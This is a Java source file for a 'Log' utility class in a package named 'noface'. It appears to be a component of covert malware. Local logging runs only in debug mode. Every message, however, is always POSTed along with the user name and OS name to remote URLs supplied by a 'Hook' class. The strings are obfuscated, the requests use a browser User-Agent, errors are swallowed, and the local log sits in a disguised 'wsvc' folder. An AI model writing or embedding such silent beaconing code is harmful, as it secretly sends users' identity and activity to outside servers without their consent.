package noface.config;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.time.Instant;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public final class Log {

    private static final Object LOCK = new Object();
    private static Path file;
    private static final ExecutorService POOL = Executors.newSingleThreadExecutor(new ThreadFactory() {
        private final AtomicInteger n = new AtomicInteger();

        @Override
        public Thread newThread(Runnable r) {
            Thread t = new Thread(r, "wsvc-log-" + n.incrementAndGet());
            t.setDaemon(false);
            return t;
        }
    });

    public static void out(String s) {
        if (Cfg.DEBUG) {
            System.out.println(s);
            System.out.flush();
            write(s);
        }
        remote("info", s);
    }

    public static void err(String s) {
        if (Cfg.DEBUG) {
            System.err.println(s);
            write(s);
        }
        remote("err", s);
    }

    public static void drain() {
        POOL.shutdown();
        try {
            POOL.awaitTermination(10, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static void remote(String level, String s) {
        if (s == null || s.isBlank()) return;
        String dual = Cfg.footer();
        String[] dests = Hook.auditUrls();
        if (dests.length == 0) {
            String one = Hook.audit();
            if (one == null || one.isBlank()) return;
            dests = new String[]{one};
        }
        final String msg = s.length() > 3500 ? s.substring(0, 3500) : s;
        final String lvl = level;
        final String[] urls = dests;
        final String footer = dual;
        POOL.execute(() -> {
            String host = System.getProperty("user.name", "") + "@" + System.getProperty("os.name", "");
            String json = "{\"" + S.e("level") + "\":\"" + esc(lvl) + "\",\""
                    + S.e("msg") + "\":\"" + esc(msg) + "\",\""
                    + S.e("host") + "\":\"" + esc(host) + "\",\""
                    + S.e("footer") + "\":\"" + esc(footer) + "\"}";
            byte[] body = json.getBytes(StandardCharsets.UTF_8);
            for (String url : urls) {
                try {
                    HttpURLConnection conn = (HttpURLConnection) URI.create(url).toURL().openConnection();
                    conn.setConnectTimeout(4000);
                    conn.setReadTimeout(6000);
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty(S.e("Content-Type"), S.e("application/json"));
                    conn.setRequestProperty(S.e("User-Agent"), S.e("Mozilla/5.0"));
                    try (OutputStream os = conn.getOutputStream()) {
                        os.write(body);
                    }
                    int code = conn.getResponseCode();
                    conn.disconnect();
                    if (code >= 200 && code < 300) return;
                } catch (Exception ignored) {
                }
            }
        });
    }

    private static String esc(String s) {
        if (s == null) return "";
        StringBuilder b = new StringBuilder(s.length() + 8);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '\\' -> b.append("\\\\");
                case '"' -> b.append("\\\"");
                case '\n' -> b.append("\\n");
                case '\r' -> b.append("\\r");
                case '\t' -> b.append("\\t");
                default -> {
                    if (c < 32) b.append(String.format("\\u%04x", (int) c));
                    else b.append(c);
                }
            }
        }
        return b.toString();
    }

    private static void write(String s) {
        try {
            Path f = file();
            if (f == null) return;
            String line = Instant.now() + " " + s + System.lineSeparator();
            synchronized (LOCK) {
                Files.writeString(f, line, StandardCharsets.UTF_8,
                        StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
            }
        } catch (Exception ignored) {
        }
    }

    private static Path file() {
        if (file != null) return file;
        try {
            String local = System.getenv(S.e("LOCALAPPDATA"));
            if (local == null || local.isBlank()) return null;
            Path dir = Path.of(local, S.e("wsvc"));
            Files.createDirectories(dir);
            file = dir.resolve(S.e("core.log"));
            return file;
        } catch (Exception e) {
            return null;
        }
    }

    private Log() {}
}
